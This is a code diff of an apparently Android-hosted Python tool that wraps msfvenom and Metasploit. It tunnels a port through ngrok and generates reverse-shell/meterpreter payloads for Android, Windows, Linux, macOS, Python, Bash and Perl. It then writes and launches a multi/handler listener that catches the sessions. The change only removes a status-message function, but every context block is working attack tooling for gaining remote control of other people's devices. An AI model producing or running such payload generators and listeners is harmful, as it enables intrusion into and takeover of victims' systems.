@@ -17,20 +17,8 @@ def ngrok(port):
     url = url.replace(':',' ')
     lhost = url.split(" ")[0]
     lport =  url.split(" ")[1]
-
-def output_pld (output):
-	if os.path.exists ("/sdcard/navin_playload"+output) == True:
-		print (cyan+"\n\nYour Payload Has generated successfull.\nIt has saved in Your \033[1;31m Internal Storage\n\033[1;36min \033[1;31m  Duck_Droid "+cyan+"  Folder"+cyan+" with the name \n\033[1;31m"+output)
-		print (cyan+"\nGo there And do Whatever You  want  To\ndo With it\n\n")
-		print ("\n\n	\033[1;36m[\033[1;34m1\033[1;36m]  \033[1;36m Back")
-		print ("	\033[1;36m[\033[1;34m2\033[1;36m]  \033[1;36m Exit")
-		back_opt = int (input ("\n\n\033[1;34mNavin_payload\033[1;31m/~  \033[1;36m"))
-		if back_opt == 2:
-			back.exite ()
-		else:
-			back.main ()
-	else:
-		print ("Your Payload has not Generated Successfully. Please Try again.")
+    
+    
 def Android ():
 	back.banner ()
 	android_pld = int (input ("""\033[1;34mSelect type of Android Payload.\n
@@ -50,7 +38,6 @@ def Android ():
 		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload"+output
 		print (cyan+"Creating Payload...\n")
 		os.system (pld)
-		output_pld (output)
 		os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
 
 	if android_pld == 4:
@@ -83,7 +70,6 @@ def Windows ():
 		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f exe -o /sdcard/navin_playload"+output
 		print (cyan+"Creating Payload...\n")
 		os.system (pld)
-		output_pld (output)
 		os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
 
 	if windows_pld == 4:
@@ -116,7 +102,6 @@ def Linux ():
 		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f elf -o /sdcard/navin_playload"+output
 		print (cyan+"Creating Payload...\n")
 		os.system (pld)
-		output_pld (output)
 		os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
 
 	if linux_pld == 4:
@@ -150,7 +135,6 @@ def Python ():
 		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload"+output
 		print (cyan+"Creating Payload...\n")
 		os.system (pld)
-		output_pld (output)
 		os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
 
 	if python_pld == 4:
@@ -176,7 +160,6 @@ def Mac ():
 	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f macho -o /sdcard/navin_playload"+output
 	print (cyan+"Creating Payload...\n")
 	os.system (pld)
-	output_pld (output)
 	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
 
 
@@ -192,7 +175,6 @@ def Bash ():
 	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload"+output
 	print (cyan+"Creating Payload...\n")
 	os.system (pld)
-	output_pld (output)
 	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
 
 
@@ -206,5 +188,4 @@ def Perl ():
 	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload"+output
 	print (cyan+"Creating Payload...\n")
 	os.system (pld)
-	output_pld (output)
 	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
